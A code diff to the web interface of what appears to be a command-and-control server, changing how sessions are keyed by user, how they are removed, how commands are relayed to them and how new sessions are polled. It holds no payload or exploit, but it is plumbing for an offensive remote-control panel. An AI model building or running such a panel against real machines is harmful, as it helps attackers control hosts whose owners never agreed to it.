@@ -21,7 +21,7 @@ def session_remove():
 		return redirect(url_for('sessions'))
 
 	# kill connection to C2
-	owner_sessions = server.c2.sessions.get(current_user.email, {})
+	owner_sessions = server.c2.sessions.get(current_user.username, {})
 
 	if session_uid and session_uid in owner_sessions:
 		session_thread = owner_sessions[session_uid]
@@ -31,11 +31,7 @@ def session_remove():
 			return "Error ending session - please try again."
 
 	# remove session from database
-	if current_user.email == app.config.get('ADMIN'):
-		s = Session.query.filter_by(uid=session_uid)
-	else:
-		s = Session.query.filter_by(owner=current_user.email, uid=session_uid)
-
+	s = Session.query.filter_by(owner=current_user.username, uid=session_uid)
 	if s:
 		s.delete()
 		db.session.commit()
@@ -56,7 +52,7 @@ def session_cmd():
 	command = request.form.get('cmd')
 
 	# get user sessions
-	owner_sessions = server.c2.sessions.get(current_user.email, {})
+	owner_sessions = server.c2.sessions.get(current_user.username, {})
 
 	if session_uid in owner_sessions:
 		session_thread = owner_sessions[session_uid]
@@ -80,5 +76,9 @@ def session_cmd():
 @login_required
 def session_poll():
 	"""Return list of sessions (JSON)."""
-	new_sessions = [s.serialize() for s in database.get_sessions_new(current_user.id)]
+	new_sessions = []
+	for s in database.get_sessions_new(current_user.id):
+		new_sessions.append(s.serialize())
+		s.new = False
+		db.session.commit()
 	return json.dumps(new_sessions)
